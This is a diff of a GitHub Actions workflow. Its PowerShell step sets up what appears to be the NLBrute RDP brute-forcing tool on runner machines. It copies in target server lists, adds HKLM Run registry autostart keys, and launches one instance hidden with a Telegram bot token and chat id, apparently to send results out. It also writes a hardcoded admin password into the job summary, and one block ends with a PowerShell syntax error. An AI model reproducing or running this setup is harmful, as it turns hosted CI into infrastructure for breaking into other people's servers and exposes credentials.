@@ -163,29 +163,21 @@ jobs:
           $exeFile1 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
           $exeFile2 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 
-          function Force-Inject-Servers($exeFile, $sourceFile) {
-              if ($exeFile) {
-                  $exeDir = $exeFile.DirectoryName
-                  $destinationFile = Join-Path $exeDir "servers.txt"
-                  if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
-                  Copy-Item -Path $sourceFile -Destination $destinationFile -Force
-                  Write-Host "Injected split file into $exeDir" -ForegroundColor Green
-              }
-          }
-
-          Force-Inject-Servers -exeFile $exeFile1 -sourceFile $splitFileSource
-          Force-Inject-Servers -exeFile $exeFile2 -sourceFile $splitFileSource
-
-          # 5. Registry & Autostart Setup
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-
           # APP 1 Setup
           if ($exeFile1) {
               $exePath1 = $exeFile1.FullName
               $exeDir1 = Split-Path $exePath1 -Parent
+              $destinationFile1 = Join-Path $exeDir1 "servers.txt"
+              
+              # Overwrite servers.txt in app folder
+              if (Test-Path $destinationFile1) { Remove-Item $destinationFile1 -Force }
+              Copy-Item -Path $splitFileSource -Destination $destinationFile1 -Force
+              
               $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
               $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
               $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
+              
+              $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
               New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
               Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
           }
@@ -194,25 +186,33 @@ jobs:
           if ($exeFile2) {
               $exePath2 = $exeFile2.FullName
               $exeDir2 = Split-Path $exePath2 -Parent
+              $destinationFile2 = Join-Path $exeDir2 "servers.txt"
+              
+              # Overwrite servers.txt in app folder
+              if (Test-Path $destinationFile2) { Remove-Item $destinationFile2 -Force }
+              Copy-Item -Path $splitFileSource -Destination $destinationFile2 -Force
+
               $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
               $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
               $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
               $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
+              
+              $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
               New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
           end
 
-          # 6. Write Summary via echo (Most Reliable)
+          # 5. Summary Injection
           $ip = $env:TAILSCALE_IP
           $summary = "### 🚀 Server ${{ matrix.server_id }} Status`n"
           $summary += "| Metric | Value |`n"
           $summary += "| :--- | :--- |`n"
           $summary += "| **Tailscale IP** | $ip |`n"
-          $summary += "| **Status** | `Deploying...` |`n"
+          $summary += "| **Status** | `Deployed` |`n"
           $summary += "| **User** | `NvdAdmin` |`n"
           $summary += "| **Password** | `P@ssw0rd1qazXSW@#` |`n"
           $summary += "---`n"
           
-          echo "$summary" >> $env:GITHUB_STEP_SUMMARY
+          $summary | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Encoding utf8 -Append
           Write-Host "Summary pushed to GitHub UI" -ForegroundColor Green
 
       - name: 8. Keep Server Alive (6 Hours)
